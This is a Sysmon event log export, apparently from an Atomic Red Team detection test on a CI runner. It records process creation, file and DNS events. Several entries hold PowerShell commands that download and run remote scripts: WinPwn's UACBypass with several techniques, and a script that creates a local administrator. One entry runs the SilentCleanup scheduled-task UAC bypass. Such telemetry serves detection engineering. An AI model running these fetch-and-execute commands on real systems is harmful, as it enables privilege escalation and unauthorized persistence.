"12/17/2025 8:02:51 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:51.022
ProcessGuid: {f995aebf-63aa-6942-9005-000000000e00}
ProcessId: 5452
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_xeqwgetc.4cr.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:51 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:51.001
ProcessGuid: {f995aebf-63aa-6942-9005-000000000e00}
ProcessId: 5452
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_xeqwgetc.4cr.ps1
CreationUtcTime: 2025-12-17 08:02:51.001
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:50 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:50.919
ProcessGuid: {f995aebf-63aa-6942-9005-000000000e00}
ProcessId: 5452
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
UACBypass -noninteractive -command \""""C:\windows\system32\cmd.exe\"""" -technique DiskCleanup}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-5a02-000000000e00}
ParentProcessId: 7900
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\76082473-4233-4a75-96ef-919776028fb6.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:50 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:50.087
ProcessGuid: {f995aebf-63a9-6942-8e05-000000000e00}
ProcessId: 6424
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_fvt4hx2c.nte.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:50 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:50.069
ProcessGuid: {f995aebf-63a9-6942-8e05-000000000e00}
ProcessId: 6424
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_fvt4hx2c.nte.ps1
CreationUtcTime: 2025-12-17 08:02:50.069
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:49 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:49.991
ProcessGuid: {f995aebf-63a9-6942-8e05-000000000e00}
ProcessId: 6424
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
UACBypass -noninteractive -command \""""C:\windows\system32\calc.exe\"""" -technique ccmstp}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-5a02-000000000e00}
ParentProcessId: 7900
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\76082473-4233-4a75-96ef-919776028fb6.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:49 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:49.016
ProcessGuid: {f995aebf-63a8-6942-8c05-000000000e00}
ProcessId: 8972
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_xhngrfta.ype.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:48 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:48.994
ProcessGuid: {f995aebf-63a8-6942-8c05-000000000e00}
ProcessId: 8972
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_xhngrfta.ype.ps1
CreationUtcTime: 2025-12-17 08:02:48.994
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:48 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:48.909
ProcessGuid: {f995aebf-63a8-6942-8c05-000000000e00}
ProcessId: 8972
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
UACBypass -noninteractive -command \""""C:\windows\system32\cmd.exe\"""" -technique magic}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-5a02-000000000e00}
ParentProcessId: 7900
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\76082473-4233-4a75-96ef-919776028fb6.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:46 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:46.741
ProcessGuid: {f995aebf-63a6-6942-7905-000000000e00}
ProcessId: 7932
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.26100.6725 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: schtasks  /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=B96AF3066F0B9DE8A460F77BAAE006C5372A266BE18C561DAA7C7AE8635D399D
ParentProcessGuid: {f995aebf-63a6-6942-7405-000000000e00}
ParentProcessId: 6732
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c ""C:\AtomicRedTeam\atomics\T1548.002\src\T1548.002.bat""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:42 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:42.732
ProcessGuid: {f995aebf-63a2-6942-6f05-000000000e00}
ProcessId: 1216
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_telobqbf.d02.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:42 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:42.711
ProcessGuid: {f995aebf-63a2-6942-6f05-000000000e00}
ProcessId: 1216
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_telobqbf.d02.ps1
CreationUtcTime: 2025-12-17 08:02:42.711
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:41 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:41.601
ProcessGuid: {f995aebf-63a1-6942-6405-000000000e00}
ProcessId: 9092
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_14v1x0p3.jup.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:41 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:41.562
ProcessGuid: {f995aebf-63a1-6942-6405-000000000e00}
ProcessId: 9092
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_14v1x0p3.jup.ps1
CreationUtcTime: 2025-12-17 08:02:41.562
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:40 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:40.817
ProcessGuid: {f995aebf-63a0-6942-5d05-000000000e00}
ProcessId: 4276
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_cdeumxco.lf1.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:40 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:40.794
ProcessGuid: {f995aebf-63a0-6942-5d05-000000000e00}
ProcessId: 4276
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_cdeumxco.lf1.ps1
CreationUtcTime: 2025-12-17 08:02:40.794
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:39 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:39.484
ProcessGuid: {f995aebf-639f-6942-4e05-000000000e00}
ProcessId: 4428
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_2i2cedm4.qap.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:39 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:39.462
ProcessGuid: {f995aebf-639f-6942-4e05-000000000e00}
ProcessId: 4428
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_2i2cedm4.qap.ps1
CreationUtcTime: 2025-12-17 08:02:39.462
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:37 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:37.066
ProcessGuid: {f995aebf-639c-6942-4505-000000000e00}
ProcessId: 880
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_n4p5i0qg.yjc.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:37 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:37.047
ProcessGuid: {f995aebf-639c-6942-4505-000000000e00}
ProcessId: 880
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_n4p5i0qg.yjc.ps1
CreationUtcTime: 2025-12-17 08:02:37.046
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:36 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:02:36.777
ProcessGuid: {f995aebf-639c-6942-4405-000000000e00}
ProcessId: 9432
Image: C:\Windows\System32\net1.exe
ImageLoaded: C:\Windows\System32\samlib.dll
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: SAM Library DLL
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: SAMLib.DLL
Hashes: SHA256=13B0BB662EE434ED5CEE876D95886F4FB5E77C636E7DC645CD7E9BE634665497
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:36 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:02:36.516
ProcessGuid: {f995aebf-639c-6942-3f05-000000000e00}
ProcessId: 2740
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\Windows\System32\samlib.dll
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: SAM Library DLL
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: SAMLib.DLL
Hashes: SHA256=13B0BB662EE434ED5CEE876D95886F4FB5E77C636E7DC645CD7E9BE634665497
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:36 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:36.312
ProcessGuid: {f995aebf-639c-6942-3f05-000000000e00}
ProcessId: 2740
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_fyvt44tm.jfp.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:36 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:36.290
ProcessGuid: {f995aebf-639c-6942-3f05-000000000e00}
ProcessId: 2740
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_fyvt44tm.jfp.ps1
CreationUtcTime: 2025-12-17 08:02:36.290
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:36 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:02:36.026
ProcessGuid: {f995aebf-639c-6942-3e05-000000000e00}
ProcessId: 5600
Image: C:\Windows\System32\net1.exe
ImageLoaded: C:\Windows\System32\samlib.dll
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: SAM Library DLL
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: SAMLib.DLL
Hashes: SHA256=13B0BB662EE434ED5CEE876D95886F4FB5E77C636E7DC645CD7E9BE634665497
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:29 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:02:28.158
ProcessGuid: {f995aebf-6393-6942-3305-000000000e00}
ProcessId: 10060
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 53574
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.110.133
DestinationHostname: cdn-185-199-110-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:02:29 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:02:28.384
ProcessGuid: {f995aebf-6393-6942-3305-000000000e00}
ProcessId: 10060
QueryName: _ldap._tcp.dc._msdcs.WORKGROUP
QueryStatus: 9003
QueryResults: -
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:29 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:02:28.211
ProcessGuid: {f995aebf-6393-6942-3305-000000000e00}
ProcessId: 10060
QueryName: _ldap._tcp.dc._msdcs.runnervm8j6r3
QueryStatus: 9003
QueryResults: -
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:29 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:02:28.154
ProcessGuid: {f995aebf-6393-6942-3305-000000000e00}
ProcessId: 10060
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:28 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:02:28.368
ProcessGuid: {f995aebf-6394-6942-3605-000000000e00}
ProcessId: 1384
Image: C:\Windows\System32\net1.exe
ImageLoaded: C:\Windows\System32\samlib.dll
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: SAM Library DLL
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: SAMLib.DLL
Hashes: SHA256=13B0BB662EE434ED5CEE876D95886F4FB5E77C636E7DC645CD7E9BE634665497
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:28 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:02:28.213
ProcessGuid: {f995aebf-6393-6942-3305-000000000e00}
ProcessId: 10060
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\Windows\System32\samlib.dll
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: SAM Library DLL
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: SAMLib.DLL
Hashes: SHA256=13B0BB662EE434ED5CEE876D95886F4FB5E77C636E7DC645CD7E9BE634665497
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:27 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:27.933
ProcessGuid: {f995aebf-6393-6942-3305-000000000e00}
ProcessId: 10060
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_1iougqna.tki.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:27 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:27.913
ProcessGuid: {f995aebf-6393-6942-3305-000000000e00}
ProcessId: 10060
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_1iougqna.tki.ps1
CreationUtcTime: 2025-12-17 08:02:27.913
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:27 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:27.835
ProcessGuid: {f995aebf-6393-6942-3305-000000000e00}
ProcessId: 10060
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/Persistence/CreateNewLocalAdmin_ART.ps1')}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-5a02-000000000e00}
ParentProcessId: 7900
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\76082473-4233-4a75-96ef-919776028fb6.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:27 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:02:27.598
ProcessGuid: {f995aebf-6393-6942-3205-000000000e00}
ProcessId: 3196
Image: C:\Windows\System32\net1.exe
ImageLoaded: C:\Windows\System32\samlib.dll
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: SAM Library DLL
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: SAMLib.DLL
Hashes: SHA256=13B0BB662EE434ED5CEE876D95886F4FB5E77C636E7DC645CD7E9BE634665497
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:27 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:02:27.495
ProcessGuid: {f995aebf-6393-6942-3005-000000000e00}
ProcessId: 9860
Image: C:\Windows\System32\net1.exe
ImageLoaded: C:\Windows\System32\samlib.dll
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: SAM Library DLL
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: SAMLib.DLL
Hashes: SHA256=13B0BB662EE434ED5CEE876D95886F4FB5E77C636E7DC645CD7E9BE634665497
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:27 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:02:27.154
ProcessGuid: {f995aebf-6392-6942-2b05-000000000e00}
ProcessId: 956
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\Windows\System32\samlib.dll
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: SAM Library DLL
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: SAMLib.DLL
Hashes: SHA256=13B0BB662EE434ED5CEE876D95886F4FB5E77C636E7DC645CD7E9BE634665497
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:26 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:26.950
ProcessGuid: {f995aebf-6392-6942-2b05-000000000e00}
ProcessId: 956
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_onp3zdcv.cvy.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:26 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:26.930
ProcessGuid: {f995aebf-6392-6942-2b05-000000000e00}
ProcessId: 956
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_onp3zdcv.cvy.ps1
CreationUtcTime: 2025-12-17 08:02:26.930
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:26 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:02:24.726
ProcessGuid: {f995aebf-6390-6942-2305-000000000e00}
ProcessId: 4620
QueryName: localhost
QueryStatus: 0
QueryResults: 127.0.0.1;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
